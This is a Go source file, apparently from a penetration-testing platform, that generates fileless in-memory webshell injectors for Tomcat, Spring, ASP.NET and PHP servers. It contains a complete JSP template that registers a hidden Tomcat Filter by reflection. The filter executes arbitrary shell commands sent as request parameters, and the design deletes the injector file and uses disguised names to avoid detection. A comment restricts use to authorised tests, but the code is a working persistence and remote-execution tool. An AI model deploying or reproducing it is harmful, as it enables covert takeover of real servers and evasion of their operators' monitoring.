// Package memshell 内存马注入载荷生成。
//
// 方案：Tomcat 7-9（javax 命名空间）Filter 型内存马——JSP 注入器 + JDK 动态代理 +
// 反射注册 StandardContext。全程无需在目标机或本地编译 Java（无需 javac）：
//  1. 经既有 WebShell 连接把注入器 JSP 写入 webapp 路径；
//  2. 请求一次注入器（?su=<密码>）完成 Filter 注册（URL 模式 /*）；
//  3. 删除注入器 JSP——内存 Filter 仍在，落盘痕迹消失（无文件驻留）；
//  4. 此后任意路径 ?pass=<密码>&cmd=<命令> 即执行命令回显，与平台
//     webshell 连接协议（pass+cmdParam）完全一致，可直接注册为 ws_* 连接。
//
// 兼容性：Tomcat 7/8/9 + JDK 7+。Tomcat 10（jakarta.*）不适用。
// 治理：仅限已获得明确授权的测试场景；注入/清理全量审计。
package memshell

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"strings"
)

// Kind 内存马类型。
type Kind string

const (
	// KindTomcatFilter Tomcat 7-9（javax）Filter 型（动态代理 + 反射注册，免编译）。
	KindTomcatFilter Kind = "jsp-tomcat-filter"
	// KindTomcatFilterJakarta Tomcat 10/11（jakarta 命名空间）Filter 型。
	KindTomcatFilterJakarta Kind = "jsp-tomcat-filter-jakarta"
	// KindTomcatValve Tomcat Valve 型（JSP 内嵌 Valve 子类 + Pipeline 注册）。
	KindTomcatValve Kind = "jsp-tomcat-valve"
	// KindTomcatServlet Tomcat Servlet 型（Servlet 接口动态代理 + StandardWrapper 注册）。
	KindTomcatServlet Kind = "jsp-tomcat-servlet"
	// KindSpringController Spring MVC Controller 型（代理 + registerSingleton + registerHandler）。
	KindSpringController Kind = "jsp-spring-controller"
	// KindAspxHttpModule ASP.NET HttpModule 型（HttpApplication.RegisterModule）。
	KindAspxHttpModule Kind = "aspx-httpmodule"
	// KindPhpUserIni PHP 准无文件持久化（payload + .user.ini auto_prepend）。
	// 严格说是文件驻留（两枚），但不在 web 可解析入口，适合 PHP 场景长期驻留。
	KindPhpUserIni Kind = "php-user-ini"
)

// kinds 全量可枚举（工具描述/探测建议共用）。
var allKinds = []Kind{KindTomcatFilter, KindTomcatFilterJakarta, KindTomcatValve,
	KindTomcatServlet, KindSpringController, KindAspxHttpModule, KindPhpUserIni}

// Kinds 返回全部支持的内存马类型标识。
func Kinds() []string {
	out := make([]string, 0, len(allKinds))
	for _, k := range allKinds {
		out = append(out, string(k))
	}
	return out
}

// TriggerParam 注入器触发参数（首请求携带 ?su=<密码> 完成注册）。
const TriggerParam = "su"

// Options 生成参数；FilterName 空则随机（低噪音）。
// Mapping 注册路径/映射（servlet 型的 URL、spring 型的 handler 路径），空值随机低噪音。
type Options struct {
	Kind       Kind
	Password   string
	FilterName string
	Watermark  string
	Mapping    string
}

// Payload 生成结果。
type Payload struct {
	Content    []byte
	Kind       Kind
	Password   string
	FilterName string
	SHA256     string
	TemplateID string
	// Mapping 注册路径（servlet/spring 型有值，供回显与注册连接用）。
	Mapping string
	// ExtraFiles kind 附属文件（如 php-user-ini 的 .user.ini），随注入器一并写入同目录。
	ExtraFiles map[string]string
	// Triggerless true = 无需 ?su= 触发请求，落盘即生效（php-user-ini）。
	Triggerless bool
}

// NormalizeKind 归一化类型标识，未知值报错。
func NormalizeKind(s string) (Kind, error) {
	trimmed := Kind(strings.TrimSpace(s))
	if trimmed == "" {
		return KindTomcatFilter, nil
	}
	for _, k := range allKinds {
		if trimmed == k {
			return k, nil
		}
	}
	return "", fmt.Errorf("unsupported memshell kind %q (supported: %s)", s, strings.Join(Kinds(), ", "))
}

// SupportsRemover 该类型是否有配套卸载器（当前仅 Tomcat Filter 家族）。
func SupportsRemover(k Kind) bool {
	return k == KindTomcatFilter
}

// Generate 渲染注入器（按 kind 分派模板；命名空间/容器差异见各模板文件头）。
func Generate(opts Options) (*Payload, error) {
	kind, err := NormalizeKind(string(opts.Kind))
	if err != nil {
		return nil, err
	}
	password := strings.TrimSpace(opts.Password)
	if password == "" {
		return nil, fmt.Errorf("password 必填（内存马鉴权口令）")
	}
	if err = assertSafeLiteral(password); err != nil {
		return nil, fmt.Errorf("password: %w", err)
	}
	filterName := strings.TrimSpace(opts.FilterName)
	if filterName == "" {
		filterName = randomFilterName()
	}
	if err = assertSafeLiteral(filterName); err != nil {
		return nil, fmt.Errorf("filter_name: %w", err)
	}
	watermark := sanitizeWatermark(opts.Watermark)
	mapping := strings.TrimSpace(opts.Mapping)
	if mapping == "" {
		mapping = randomMapping()
	} else if !strings.HasPrefix(mapping, "/") {
		mapping = "/" + mapping
	}

	p := &Payload{
		Kind:       kind,
		Password:   password,
		FilterName: filterName,
		Mapping:    mapping,
	}
	vars := func() *strings.Replacer {
		return strings.NewReplacer(
			"{{WATERMARK}}", watermark,
			"{{PASSWORD}}", password,
			"{{FILTER_NAME}}", filterName,
			"{{MAPPING}}", mapping,
			"{{TRIGGER_PARAM}}", TriggerParam,
		)
	}

	switch kind {
	case KindTomcatFilter:
		p.Content = []byte(vars().Replace(tomcatFilterTemplate))
		p.TemplateID = "tomcat-filter-proxy"
	case KindTomcatFilterJakarta:
		p.Content = []byte(vars().Replace(tomcatFilterJakartaTemplate))
		p.TemplateID = "tomcat-filter-proxy-jakarta"
	case KindTomcatValve:
		p.Content = []byte(vars().Replace(tomcatValveTemplate))
		p.TemplateID = "tomcat-valve-inner"
	case KindTomcatServlet:
		p.Content = []byte(vars().Replace(tomcatServletTemplate))
		p.TemplateID = "tomcat-servlet-proxy"
	case KindSpringController:
		p.Content = []byte(vars().Replace(springControllerTemplate))
		p.TemplateID = "spring-controller-proxy"
	case KindAspxHttpModule:
		p.Content = []byte(vars().Replace(aspxHttpModuleTemplate))
		p.TemplateID = "aspx-httpmodule-register"
	case KindPhpUserIni:
		p.Content = []byte(vars().Replace(phpUserIniPayloadTemplate))
		p.ExtraFiles = map[string]string{".user.ini": "auto_prepend_file=" + filterName + "\n"}
		p.Triggerless = true
		p.TemplateID = "php-user-ini-prepend"
	default:
		return nil, fmt.Errorf("unsupported memshell kind %q", kind)
	}
	sum := sha256.Sum256(p.Content)
	p.SHA256 = hex.EncodeToString(sum[:])
	return p, nil
}

// randomMapping 低噪音注册路径（servlet/spring 型）。
func randomMapping() string {
	// 重复清单收敛：委托 randHex（原手写 crypto/rand，失败保留固定回退）
	if token, err := randHex(4); err == nil {
		return "/ws" + token
	}
	return "/ws0"
}

// randomFilterName 低噪音 Filter 名（模仿框架命名，降低肉眼/规则敏感度）。
func randomFilterName() string {
	if token, err := randHex(4); err == nil {
		return "wsF" + token
	}
	return "wsFilter0"
}

const tomcatFilterTemplate = `<%-- {{WATERMARK}} --%>
<%@ page import="java.lang.reflect.*, java.util.*, javax.servlet.*" %>
<%
String pw = request.getParameter("{{TRIGGER_PARAM}}");
if (pw != null && pw.equals("{{PASSWORD}}")) {
    final String fPass = "{{PASSWORD}}";
    final String fName = "{{FILTER_NAME}}";
    try {
        ServletContext sc = request.getServletContext();
        Field fCtx = sc.getClass().getDeclaredField("context");
        fCtx.setAccessible(true);
        Object appCtx = fCtx.get(sc);
        Field fStd = appCtx.getClass().getDeclaredField("context");
        fStd.setAccessible(true);
        Object stdCtx = fStd.get(appCtx);

        Class<?> filterDefCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        Class<?> filterMapCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        Class<?> appFilterConfigCls = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
        Class<?> contextCls = Class.forName("org.apache.catalina.Context");

        Filter filter = (Filter) Proxy.newProxyInstance(
            Thread.currentThread().getContextClassLoader(),
            new Class[]{ Filter.class },
            new InvocationHandler() {
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    if ("doFilter".equals(method.getName())) {
                        javax.servlet.ServletRequest req = (javax.servlet.ServletRequest) args[0];
                        javax.servlet.ServletResponse resp = (javax.servlet.ServletResponse) args[1];
                        String p = req.getParameter("pass");
                        if (fPass.equals(p)) {
                            String c = req.getParameter("cmd");
                            if (c != null && c.length() > 0) {
                                String osName = System.getProperty("os.name", "").toLowerCase();
                                String[] sh = osName.contains("win") ? new String[]{"cmd.exe", "/c"} : new String[]{"/bin/sh", "-c"};
                                ProcessBuilder pb = new ProcessBuilder(sh[0], sh[1], c);
                                pb.redirectErrorStream(true);
                                java.io.InputStream in = pb.start().getInputStream();
                                java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(in));
                                java.io.PrintWriter w = resp.getWriter();
                                String line;
                                while ((line = br.readLine()) != null) { w.println(line); }
                                w.flush();
                                return null;
                            }
                        }
                        args[2].doFilter(args[0], args[1]);
                        return null;
                    }
                    return null;
                }
            });

        Object filterDef = filterDefCls.newInstance();
        filterDefCls.getMethod("setFilter", Filter.class).invoke(filterDef, filter);
        filterDefCls.getMethod("setFilterName", String.class).invoke(filterDef, fName);
        filterDefCls.getMethod("setFilterClass", String.class).invoke(filterDef, filter.getClass().getName());
        stdCtx.getClass().getMethod("addFilterDef", filterDefCls).invoke(stdCtx, filterDef);

        Object filterMap = filterMapCls.newInstance();
        filterMapCls.getMethod("addURLPattern", String.class).invoke(filterMap, "/*");
        filterMapCls.getMethod("setFilterName", String.class).invoke(filterMap, fName);
        Class<?> dmCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        dmCls.getMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
        stdCtx.getClass().getMethod("addFilterMapBefore", filterMapCls).invoke(stdCtx, filterMap);

        Field fCfgs = stdCtx.getClass().getDeclaredField("filterConfigs");
        fCfgs.setAccessible(true);
        Map cfgs = (Map) fCfgs.get(stdCtx);
        Constructor<?> ctor = appFilterConfigCls.getDeclaredConstructor(contextCls, filterDefCls);
        ctor.setAccessible(true);
        cfgs.put(fName, ctor.newInstance(stdCtx, filterDef));

        out.println("MEMSHELL_OK:" + fName);
    } catch (Exception e) {
        out.println("MEMSHELL_FAIL:" + e);
    }
} else {
    out.println("hello");
}
%>`
